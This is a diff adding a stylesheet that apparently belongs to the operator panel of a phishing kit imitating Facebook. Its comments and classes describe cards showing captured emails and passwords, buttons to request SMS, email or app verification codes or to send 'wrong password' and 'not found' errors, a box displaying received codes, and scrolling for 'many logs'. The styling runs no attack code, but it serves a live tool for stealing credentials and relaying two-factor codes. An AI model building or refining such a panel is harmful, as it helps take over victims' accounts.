@@ -1,0 +1,210 @@
+body {
+  margin: 0;
+  font-family: Arial, Helvetica, sans-serif;
+  background: #f0f2f5;
+  padding: 20px;
+}
+
+/* Title */
+h2 {
+  color: #1877f2;
+  margin-bottom: 10px;
+}
+
+/* Section container */
+#messages, #loginContainer {
+  background: #fff;
+  padding: 15px;
+  border-radius: 10px;
+  box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+  margin-bottom: 20px;
+}
+
+/* Login card */
+.login-card {
+  background: #fff;
+  border-radius: 10px;
+  padding: 15px;
+  margin-bottom: 15px;
+  border-left: 4px solid #1877f2;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+}
+
+/* Email + Password */
+.login-card p {
+  margin: 5px 0;
+  font-size: 14px;
+}
+
+/* Buttons container */
+.buttons {
+  margin-top: 10px;
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+}
+
+/* Buttons base */
+button {
+  padding: 8px 12px;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  font-size: 13px;
+  transition: 0.2s;
+}
+
+/* Verification buttons */
+button.sms {
+  background: #42b72a;
+  color: #fff;
+}
+
+button.email {
+  background: #1877f2;
+  color: #fff;
+}
+
+button.app {
+  background: #f02849;
+  color: #fff;
+}
+
+/* Error buttons */
+button.wrong-pass {
+  background: #ff9800;
+  color: #fff;
+}
+
+button.not-found {
+  background: #9c27b0;
+  color: #fff;
+}
+
+/* Hover effect */
+button:hover {
+  opacity: 0.85;
+  transform: scale(1.05);
+}
+
+/* Code display */
+.code-box {
+  margin-top: 10px;
+  padding: 8px;
+  background: #f7f7f7;
+  border-radius: 6px;
+  font-size: 13px;
+  color: #333;
+}
+
+/* RESET BUTTON */
+#resetBtn {
+  background: #f02849;
+  color: #fff;
+  padding: 10px 15px;
+  font-size: 14px;
+  margin-bottom: 15px;
+}
+
+#resetBtn:hover {
+  background: #d81b3a;
+}
+
+/* Scroll fix for many logs */
+#loginContainer {
+  max-height: 70vh;
+  overflow-y: auto;
+}
+
+.admin-btn {
+  padding: 8px 12px;
+  margin: 3px;
+  border-radius: 5px;
+  border: none;
+  cursor: pointer;
+  background-color: #1877f2;
+  color: white;
+  font-size: 14px;
+  transition: 0.2s;
+}
+
+.admin-btn:hover {
+  background-color: #166fe5;
+}
+
+.admin-btn.active {
+  background-color: #42b72a; /* Green shows it’s clicked */
+  color: white;
+  pointer-events: none; /* Optional: prevent double click */
+}
+
+.login-card {
+  border: 1px solid #ddd;
+  padding: 15px;
+  margin-bottom: 15px;
+  border-radius: 10px;
+  background: #fff;
+  box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+}
+
+.buttons button {
+  padding: 8px 12px;
+  margin: 4px;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+}
+
+.buttons button.active {
+  background: #42b72a;
+  color: #fff;
+}
+
+.sms { background: #1877f2; color: #fff; }
+.email { background: #f7b928; color: #fff; }
+.app { background: #9b59b6; color: #fff; }
+.wrong-pass { background: #e74c3c; color: #fff; }
+.not-found { background: #d35400; color: #fff; }
+
+.code-box {
+  margin-top: 10px;
+  padding: 8px;
+  border: 1px solid #ddd;
+  border-radius: 6px;
+  background: #f0f2f5;
+}
+
+.reset-btn {
+  font-weight: bold;
+  border-radius: 6px;
+  padding: 10px 15px;
+}
+
+.login-info {
+  font-size: 14px;
+  color: #333;
+  margin-bottom: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.login-text {
+  font-weight: bold;
+  margin-right: 10px;
+}
+
+.copy-btn {
+  background: #1877f2;
+  color: #fff;
+  border: none;
+  border-radius: 6px;
+  padding: 4px 8px;
+  cursor: pointer;
+  font-size: 12px;
+  transition: background 0.3s;
+}
+
+.copy-btn:hover {
+  background: #145dbf;
+}
